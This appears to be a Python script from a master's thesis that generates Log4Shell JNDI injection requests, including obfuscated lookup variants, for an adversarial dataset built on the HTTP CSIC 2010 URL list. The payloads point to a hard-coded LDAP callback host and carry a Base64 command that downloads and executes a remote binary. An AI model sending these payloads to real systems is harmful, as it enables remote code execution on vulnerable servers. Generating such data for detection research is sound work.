import io
import os
from urllib.request import CacheFTPHandler
from matplotlib.font_manager import json_dump
import secml
from secml.data import CDataset
from sklearn.model_selection import train_test_split

urls = '/Users/jan/Documents/Master_Thesis/HTTP_CSIC_2010/url_list.txt'

malicious_ip = '84.247.48.62:12344'
malicious_content = '/Basic/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS5eDY='
methods = ['post', 'get', 'put']

#additional options
    #"jndi:ldap" ,
    #"jndi:dns" ,
    #"jndi:rmi" ,
    #"j}ndi" ,
    #"jndi%3Aldap" ,
    #"jndi%3Aldns" ,

jndi_list = [
    "${jndi:ldap://" ,
    "${jndi:ldap://" ,
    "${jndi:ldap://" ,
    "${${::-j}${::-n}${::-d}${::-i}://" ,
    "${${::-j}ndi://",
    "${${lower:jndi}://"
]

malicious_ip = '84.247.48.62:12344'
malicious_content = '/Basic/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS5eDY='
methods = ['post', 'get', 'put']


def create_log4j_request(method, url, payload):
    req = method + url + '/' + payload
    return req

def create_payload(list, ip, content):
    payload_list = []
    for jndi in list:
        payload_list.append(jndi + ip + content)
    return payload_list

def build_adversarial_list(url_list):
    adversarial_list = []
    payload_list = create_payload(list=jndi_list, ip=malicious_ip, content=malicious_content)

    for m in methods:
        for url in url_list:
            for payload in payload_list:
                adversarial_list.append(create_log4j_request(m, url.rstrip(), payload))
    return adversarial_list
'''
file = open(urls)
url_list = file.readlines()

ad_list = build_adversarial_list(url_list)


if not os.path.exists('/Users/jan/Documents/GitHub/ma-thesis_cs20m019/adversarial.txt'):
    fout = io.open('/Users/jan/Documents/GitHub/ma-thesis_cs20m019/adversarial.txt', "w", encoding="utf-8")
    for line in ad_list:
        fout.write(line + '\n')
    print("finished parse ",len(ad_list)," requests")
    fout.close()
 '''
